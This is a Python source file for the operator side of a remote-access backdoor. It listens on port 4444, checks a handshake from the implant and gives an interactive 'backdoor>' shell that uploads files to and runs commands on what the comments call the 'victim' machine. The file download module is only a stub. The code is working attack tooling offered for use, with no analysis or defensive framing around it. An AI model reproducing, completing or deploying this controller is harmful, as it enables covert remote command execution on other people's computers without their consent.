import os
import sys
import time
import socket
import base64
import argparse
import struct

class BackdoorServerModuleInterface:

	def __init__(self, handler):
		self.handler = handler
		self.conn = handler.conn
		self.cmdModules = ["upload", "download", "exec", "goodbye"]

	def runCMD(self, cmd):

		# If module does not exist execute it on the current system
		if not cmd[0] in self.cmdModules:
			os.system(cmd[0])
			return

		# Get the command's function
		cmdFunction = getattr(self, cmd[0])

		# Notify victim of cmd to be executed
		self.handler.send_msg(cmd[0])

		# Run the command
		return cmdFunction(cmd)

	def upload(self, argv):

		if len(argv) < 3:
			return b'INVALID_ARGUMENT'

		LFILE = argv[1]
		RFILE = argv[2]
		DATA = open(LFILE, 'rb').read()
		DATA = base64.b64encode(DATA)
		print("Sending LOCAL:%s to REMOTE:%s (%ld bytes)..." % (LFILE, RFILE, len(DATA)))
		self.handler.send_msg(RFILE) # SEND FILENAME
		self.handler.send_msg(DATA) # SEND DATA
		return self.handler.recv_msg()

	def download(self, argv):

		if len(argv) < 3:
			return b'INVALID_ARGUMENT'

		RFILE = argv[1]
		LFILE = argv[2]

		return b'INVALID_ARGUMENT'


	def exec(self, argv):

		if len(argv) < 2:
			return b'INVALID_ARGUMENT'

		CMD = argv[1]
		self.handler.send_msg(CMD)
		return self.handler.recv_msg()

	def goodbye(self, argv):
		self.conn.close()
		self.conn = None


class BDClientHandler:

	def __init__(self, conn, addr):
		self.conn = conn
		self.addr = addr
		print("[+] Backdoor session opened by", addr)

	def send_msg(self, msg):
		if isinstance(msg, str): 
			msg = msg.encode()
		msg = struct.pack('>I', len(msg)) + msg # len + msg
		self.conn.sendall(msg)

	def recv_msg(self):
		msgLen = self.recvall(4)
		if not msgLen:
			return None
		msgLen = struct.unpack('>I', msgLen)[0]
		print("INCOMING PACKET: %d bytes" % msgLen)
		return self.recvall(msgLen).decode('ascii')

	def recvall(self, n):
		data = bytearray()
		while len(data) < n:
			packet = self.conn.recv(n - len(data))
			if not packet:
				return None
			data.extend(packet)
		return data

	def handshake(self):
		if self.recv_msg() != 'BD_HSK':
			self.conn.close()
			return False

		return True

class BackdoorServer:

	def __init__(self, LHOST="0.0.0.0", LPORT=4444):
		self.LHOST = LHOST
		self.LPORT = LPORT
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
		self.client = None

	def startListening(self):
		self.s.bind((self.LHOST, self.LPORT))
		self.s.listen(4)
		print("Listening on %s:%d" % (self.LHOST, self.LPORT))

		while True:

			print("[*] Waiting for clients to connect...")
			# Wait for connection
			conn, addr = self.s.accept()

			# Start new connection handler
			self.client = BDClientHandler(conn, addr)
			
			# Validate client with handshake
			if not self.client.handshake():
				self.client = None
				continue

			# Start module interface
			moduleInterface = BackdoorServerModuleInterface(self.client)
			while moduleInterface.conn:
				cmd = input("backdoor> ").split(" ")
				result = moduleInterface.runCMD(cmd)
				print(result)

if __name__ == "__main__":
	server = BackdoorServer()
	server.startListening()